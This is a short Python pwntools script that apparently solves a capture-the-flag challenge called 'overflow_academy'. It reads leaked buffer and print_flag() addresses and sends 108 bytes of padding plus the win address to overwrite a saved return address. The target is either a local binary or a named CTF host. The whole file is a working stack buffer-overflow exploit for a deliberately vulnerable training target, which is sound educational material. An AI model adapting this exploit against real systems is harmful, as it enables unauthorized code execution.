#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# Configuration
if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    HOST = 'overflow.challenges2.ctf.dscjssstuniv.in'
    PORT = 9001
    io = remote(HOST, PORT)
else:
    io = process('./overflow_academy')

# Receive banner
banner = io.recvuntil(b'Buffer address: ')
print(banner.decode(errors='ignore'))

buffer_addr = int(io.recvline().strip(), 16)

io.recvuntil(b'Secret function address: ')
win_addr = int(io.recvline().strip(), 16)

log.info(f"Buffer address: {hex(buffer_addr)}")
log.info(f"print_flag() address: {hex(win_addr)}")

# Build payload:
# - Padding to reach return address (100 bytes buffer + 8 bytes saved RBP)
# - Return address pointing to print_flag()

offset = 108  # 100 bytes buffer + 8 bytes saved RBP
payload = b'A' * offset
payload += p64(win_addr)

log.info(f"Payload size: {len(payload)} bytes")
log.info(f"Overwriting return address with print_flag()...")

io.sendline(payload)

# Receive and print the flag
print("\n" + "="*50)
response = io.recvall(timeout=2).decode(errors='ignore')
print(response)
print("="*50)
